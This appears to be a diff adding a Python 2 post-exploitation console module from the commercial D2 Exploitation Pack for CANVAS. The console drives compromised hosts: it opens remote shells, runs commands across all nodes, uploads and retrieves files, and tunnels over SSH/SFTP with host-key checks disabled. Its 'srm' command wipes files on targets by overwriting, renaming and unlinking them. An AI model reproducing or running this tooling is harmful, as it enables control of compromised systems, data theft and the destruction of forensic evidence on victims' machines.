@@ -1,0 +1,667 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+import sys, os, cmd, time, traceback, select
+
+sys.path.append(".")
+sys.path.append("3rdparty/D2SEC/libs")
+
+from canvasexploit import canvasexploit
+
+from exploitutils import *
+import libs.canvasos as canvasos
+import canvasengine
+from shelllistener import *
+from threading import Lock
+
+from shellserver import unixshellserver
+from MOSDEFShellServer import MSSgeneric
+
+import interactive
+import libs.paramiko as paramiko
+
+NAME = "D2SEC Cmdline"
+DESCRIPTION = "D2SEC Cmdline"
+DOCUMENTATION = {}
+DOCUMENTATION["Notes"] = """
+This module permits to get a shellshock (and another utilities) from a
+Canvas GUI and not from commandlineInterface.py script.
+
+You can run a command for 1, multiple or all nodes. For example :
+
+- exec command on node 1:
+d2sec> exec 1 /bin/ls 
+
+- exec command on nodes 2 and 4:
+d2sec> exec 2,4 /bin/ls
+
+- exec command on all nodes:
+d2sec> exec -1 /bin/ls
+"""
+
+VERSION="0.1"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Tool"
+PROPERTY['ARCH'] = [ ["All"] ]
+
+class sshpolicy:
+	def missing_host_key(self, client, hostname, key):
+		return
+
+class theexploit(cmd.Cmd, canvasexploit):
+	def __init__(self):
+		canvasexploit.__init__(self)
+		cmd.Cmd.__init__(self)
+
+		self.name = NAME
+		self.prompt = ""
+		self.node = []
+		self.flog = None 
+		self.intro = """
+[#] D2Sec Cmdline session.   
+[#] Type ? for help
+"""
+
+	def emptyline(self):
+		print "Type 'quit' to terminate this session or type ? for help"
+
+	def default(self, line):
+		print "*** Unknown Syntax : %s (type help for a list of valid command)" % line
+	
+	def do_help(self, arg):
+		"""Help\n"""
+		help = """
+Command Shell
+---------------
+shell      - Run a shellshock
+ssh        - SSH Session
+exec       - Execute a command
+scmd       - Execute a file of commands
+
+Canvas Command
+---------------
+runmod     - Run a Canvas module
+
+Data
+------
+datap      - Data pipe
+sftp       - SFTP download/upload
+srm        - Secure undelete    
+send       - Send a file
+suue       - Send a uuencoded file
+retr       - Retrieve a file
+
+Misc
+------
+help       - This help
+log        - Log output to file
+list       - List available nodes
+quit       - Quit
+"""
+		print help
+
+	######################################################################
+	def do_log(self, arg):
+		"""\nLog this session: 'log start <logfile>' to start logging and 'log stop' to stop logging\n"""
+		args = arg.split()
+
+		usage = """
+usage: log start <logfile>
+       log stop
+		"""
+
+		if len(args) < 1:
+			print usage
+			return 
+
+		if args[0] == "start":
+			if len(args) < 2:
+				print usage
+				return
+
+			self.flog = args[1]
+
+		elif args[0] == "stop":
+			self.flog = None
+			
+		else:
+			print usage
+			
+	def write_log(self, data):
+		if len(data) >= 0 and self.flog is not None:
+			try:
+				f = open(self.flog, "a")
+			except:
+				print "Can't open log file %s" % self.flog
+				return
+
+			f.write(data)
+			f.close()
+
+	######################################################################
+	def do_ssh(self, arg):
+		"""\rRun an ssh session\n"""
+		args = arg.split()
+
+		if len(args) != 3:
+			print "Usage: ssh <host:port> <user> <pass>\n"
+			return
+
+		host = args[0].split(":")[0]
+		port = int(args[0].split(":")[1])
+		user = args[1]
+		passwd = args[2]
+
+		#paramiko_log_file = "paramiko.log"
+		#paramiko.util.log_to_file(paramiko_log_file)
+
+		try:
+			pol = sshpolicy()
+
+			client = paramiko.SSHClient()
+			client.set_missing_host_key_policy(pol)
+			client.connect(host, port=port, username=user, password=passwd)
+			chan = client.invoke_shell()
+			interactive.interactive_shell(chan)
+			chan.close()
+		except:
+			traceback.print_exc()
+
+		try:
+			client.close()
+		except:
+			pass
+
+		#os.unlink(paramiko_log_file)
+
+		return
+
+	######################################################################
+	def do_datap(self, arg):
+		"""\nData pipe\n"""
+		args = arg.split()
+
+		if len(args) != 3:
+			print "Usage: datap <localport> <remotehost> <remoteport>\n"
+			return
+
+		localport = int(args[0])
+		if localport < 0 or localport > 65535:
+			print "Invalid locaport\n"
+			return
+
+		remoteport = int(args[2])
+		if localport < 0 or localport > 65535:
+			print "Invalid locaport\n"
+			return
+
+	######################################################################
+	def do_sftp(self, arg):
+		"""\nSend a file by SSH protocol\n"""
+		args = arg.split()
+
+		if len(args) != 6:
+			print "Usage: sftp [put|get] <host:port> <user> <pass> <src file> <dest file>\n"
+			return
+	
+		method = args[0]
+		if method != "put" and method != "get":
+			print "Invalid method: only put or get valid method\n"
+			return
+ 
+		host = args[1].split(":")[0]
+		port = int(args[1].split(":")[1])
+		user = args[2]
+		passwd = args[3]
+		src = args[4]
+		dest = args[5]
+
+		#paramiko_log_file = "paramiko.log"
+		#paramiko.util.log_to_file(paramiko_log_file)
+
+		if not os.path.exists(src):
+			print "Source file %s not found !\n" % src
+			return
+
+		try:
+			t = paramiko.Transport((host, port))
+			t.connect(username=user, password=passwd)
+			sftp = paramiko.SFTPClient.from_transport(t)
+
+			if method == "put":
+				sftp.put(src, dest)
+			if method == "get":
+				sftp.get(src, dest)
+				
+		except:
+			traceback.print_exc()
+			return
+
+		try:
+			t.close()
+		except:
+			pass
+
+		#os.unlink(paramiko_log_file)
+
+		return
+
+	######################################################################
+	def write_in_file(self, file, str, node):
+		libc = node.shell.libc
+
+		O_RDWR = libc.getdefine('O_RDWR')
+
+		f = node.shell.open(file, O_RDWR, 0644)
+		if f < 0:
+			print "[#%s] Can't open %s...\n" % (node.getname(), file)
+			return -1
+
+		r = node.shell.write(f, str)
+		if r != 1:
+			print "[#%s] Write failed\n" % node.getname()
+			return -1
+       
+		node.shell.close(f)
+		return 0
+		
+	def _srm(self, file, node):
+		r, st = node.shell.stat(file)
+		if r != 0:
+			print "[#%s] Can't stat %s\n" % (node.getname(), file)
+			return
+
+		### overwrite with 0xff
+		s = '\xff' * st['st_size']
+		i = self.write_in_file(file, s, node)
+		if i == -1:
+			return
+	
+		node.shell.runcommand('sync')
+
+		### overwrite with random data
+		import binascii
+
+		RAND_MAX = 2147483647
+
+		i = 0
+		while i < 38:
+			s = ""
+			j = 0
+			while j < st['st_size']:
+				s += chr(int(256*random.randint(0, RAND_MAX)/(RAND_MAX+1)))
+				j = j+1
+
+			n = self.write_in_file(file, s, node)
+			if n == -1:
+				return
+				
+			i = i+1
+				
+		### truncate file
+		O_WRONLY = node.shell.libc.getdefine('O_WRONLY')
+		O_TRUNC = node.shell.libc.getdefine('O_TRUNC')
+
+		f = node.shell.open(file, O_WRONLY|O_TRUNC)
+		if f >= 0:
+			node.shell.close(f)
+
+		# O_SYNC unknown in MOSDEF, so we call sync command
+		node.shell.runcommand('sync')
+
+		### rename file
+		import tempfile
+		t = tempfile.mktemp()
+		new = file.replace(os.path.basename(file), t)
+
+		node.shell.runcommand('mv %s %s' % (file, new))
+		node.shell.runcommand('sync')
+		node.shell.unlink(file)
+
+		print "[#%s] %s deleted !" % (node.getname(), file)
+		return
+
+	def do_srm(self, arg):
+		"""\nSecure delete of a file on the node: srm <num> <file>\n"""
+		args = arg.split()
+
+		if len(args) != 2:
+			print "Usage: srm <num> <file>\n"
+			return
+
+		if self.select_node(args[0]) == -1:
+			return
+
+		file = args[1]
+
+		for node in self.node:
+			if node.nodetype == "win32Node":
+				print "This command is not supported with win32Node node.\n"
+				continue
+
+			self._srm(file, node)
+
+		return
+
+	######################################################################
+	def do_shell(self, arg):
+		"""\nRun a shellshock on the node: shell <num>\n"""
+		args = arg.split()
+
+		if len(args) != 1:
+			print "Usage: shell <num>\n"
+			return
+
+		if int(args[0]) == -1:
+			print "Can't run a shellshock on many nodes\n"
+			return
+
+		if self.select_node(args[0]) == -1:
+			return
+			
+		self.node[0].shell.shellshock()
+
+	######################################################################
+	def do_exec(self, arg):
+		"""\nExecute commands on the node: exec <num> <cmd>\n"""
+		args = arg.split()
+
+		if len(args) < 2:
+			print "Usage: exec <num> <cmd>\n"
+			return
+
+		if self.select_node(args[0]) == -1:
+			return
+		
+		cmd = ""
+		for i in args[1:len(args)]:
+			cmd += i + " "
+		if len(cmd) < 1:
+			print "Invalid command\n"
+			return
+
+		for node in self.node:
+			data = ""
+			data += "[#%s] $ %s\n" % (node.getname(), cmd)
+			data += "[#%s] %s" % (node.getname(), node.shell.runcommand(cmd))
+			data += "[#%s]\n" % node.getname()
+
+			if len(data) == 0:
+				print "No result !\n"
+			else:
+				print data
+
+			self.write_log(data)
+		
+	######################################################################
+	def do_scmd(self, arg):
+		"""\nExecute commands on the node: scmd <num> <file>\n"""
+		args = arg.split()
+
+		if len(args) != 2:
+			print "Usage: scmd <num> <file>\n"
+			return
+
+		if self.select_node(args[0]) == -1:
+			return
+
+		fcmd = args[1]
+
+		if not os.path.exists(fcmd):
+			print "Commands file %s not found !" % fcmd
+			return
+
+		f = open(fcmd, 'r')
+		cmd = f.readlines()
+		f.close()
+
+		if len(cmd) == 0:
+			print "Commands file %s empty !" % fcmd
+			return
+
+		for node in self.node:
+			data = ""
+			for c in cmd:
+				if len(c) < 2:
+					continue
+
+				data += "[#%s] $ %s\n" % (node.getname(), c[:-1])
+				data += "[#%s] %s" % (node.getname(), node.shell.runcommand(c[:-1]))
+				data += "[#%s]\n" % node.getname()
+				
+
+			if len(data) == 0:
+				print "No result !\n"
+			else:
+				print data
+
+			self.write_log(data)
+
+	######################################################################
+	def do_send(self, arg):
+		"""\nSend a file to the remote host: send <num> <srcfile> <dstfile>\n"""
+		args = arg.split()
+
+		if len(args) != 3:
+			print "Usage: send <num> <srcfile> <dstfile>"
+			print "ex: send 0 /home/foo/bar /tmp/bar\n"
+			return
+
+		if self.select_node(args[0]) == -1:
+			return
+
+		src = args[1]
+		dst = args[2]
+
+		if not os.path.exists(src):
+			print "Source file %s not found !\n" % src
+			return
+
+		#if dst[len(dst)-1] != "/":
+		#	dst = dst + "/"
+
+		for node in self.node:
+			print "[#%s] uploading %s to %s" % (node.getname(), src, dst)
+
+			try:
+				node.shell.upload(src, "", dst)
+			except NodeCommandError:
+				return
+
+			print "[#%s] uploaded !\n" % node.getname()
+			
+
+	######################################################################
+	def do_suue(self, arg):
+		"""\nUuencode a binary and send to the remote host: send <num> <srcfile> <dstfile>\n"""
+		args = arg.split()
+
+		if len(args) != 3:
+			print "Usage: suue <num> <srcfile> <dstfile>"
+			print "ex: suue 0 /home/foo/bar /tmp/bar\n"
+			return
+
+		if self.select_node(args[0]) == -1:
+			return
+
+		src = args[1]
+		dst = args[2]
+
+		if not os.path.exists(src):
+			print "Source file %s not found !" % src
+			return
+
+		try:
+			f = open(src, 'rb')
+		except:
+			print "Couldn't open source file %s, sorry." % src
+			return
+
+		data = f.read()
+		f.close()
+
+		base = os.path.basename(src)
+
+		uu = uuencode_file(data, base + ".uu")
+
+		try:
+			f = open(src + ".uu", "w")
+		except:
+			print "Couldn't open source file %s, sorry." % (src + ".uu")
+			return
+
+		f.write(uu)
+		f.close()
+
+		src = src + ".uu"
+		
+		for node in self.node:
+			print "[#%s] uploading %s to %s" % (node.getname(), src, dst)
+
+			try:
+				node.shell.upload(src, "", dst)
+			except NodeCommandError:
+				return
+
+			print "[#%s] uploaded !\n" % node.getname()
+
+	######################################################################
+	def do_retr(self, arg):
+		"""\nRetr a file from the remote host: retr <num> <src file> <dest rep>\n"""
+		args = arg.split()
+
+		if len(args) != 3:
+			print "usage: retr <num> <src file> <dest rep>"
+			print "ex: retr 0 /home/foo/bar /tmp\n"
+			return
+
+		if self.select_node(args[0]) == -1:
+			return
+
+		src = args[1]
+		dst = args[2]
+
+		try:
+			os.stat(dst)
+		except OSError:
+			print "Could not find %s so creating it" % dst
+			try:
+				os.mkdir(dst)
+			except (OSError, IOError):
+				return
+
+		dir = ""
+		if src.rfind("/") != -1:
+			dir = dst + src[src.rfind("/")+1:]
+		else:
+			dir = dst + src
+		
+		for node in self.node:
+			print "[#%s] downloading %s to %s" % (node.getname(), src, dir)
+			try:
+				node.shell.download(src, dir)
+			except NodeCommandError:
+				return
+			print "[#%s] downloaded !\n" % node.getname()
+
+	######################################################################
+	def do_quit(self, arg):
+		"""\nExiting D2Sec Cmdline session\n"""
+		print "Exiting D2Sec Cmdline session...\n"
+		return -1
+
+	######################################################################
+	def do_list(self, arg):
+		"""\nList available nodes\n"""
+
+		i = 0
+
+		for node in self.argsDict["passednodes"]:
+			print "[%d] %s - %s (%s)" % (i, node.getname(), node.nodetype, node.get_interesting_interface())
+			i = i+1
+	
+	######################################################################
+	def do_runmod(self, arg):
+		"""\nRun a canvas module\n"""
+		args = arg.split()
+
+		if len(args) < 2:
+			print "usage: runmod <num> <module> <module args>"
+			print "ex: runmod \n"
+			return
+
+		if self.select_node(args[0]) == -1:
+			return
+
+		module = args[1]
+
+		mod_args = ""
+		for i in args[2:len(args)]:
+			mod_args += i + " "
+
+		for node in self.node:
+			import canvasengine
+			app = canvasengine.getModuleExploit(module)
+			app.link(self)
+			standard_callback_commandline(app, node=node, args=mod_args, fromcommandline=False, quoteparse=True)
+
+	######################################################################
+	def select_node(self, arg):
+		self.node = []
+
+		if arg.find(",") >= 0:
+
+			arg = arg.split(",")
+			for a in arg:
+				if not a:
+					continue
+
+				if int(a) < 0 or int(a) > len(self.argsDict["passednodes"])-1:
+					print "Node %s: invalid node !\n" % a
+					return -1
+
+				self.node.append(self.argsDict["passednodes"][int(a)])
+
+		else:
+
+			n = int(arg)
+			if n < -1 or n > len(self.argsDict["passednodes"])-1:
+				print "Invalid node !\n"
+				return -1
+
+			if n == -1:
+				for node in self.argsDict["passednodes"]:
+					if node.nodetype == "LocalNode":
+						continue
+					self.node.append(node)
+			else:
+				node = self.argsDict["passednodes"][n]
+				if node.nodetype == "LocalNode":
+					print "Can't use LocalNode node !\n"
+					return -1
+				self.node.append(node)
+
+		return 0
+	
+	######################################################################
+	def run(self):
+		self.setInfo("%s (in progress)"%(NAME))
+
+		self.prompt = "d2sec> "
+		self.cmdloop()
+
+		self.setInfo("%s (finished)"%(NAME))
+		return 1
+
+if __name__ == "__main__":
+	print "Running CANVAS %s v %s" % (NAME,VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
+
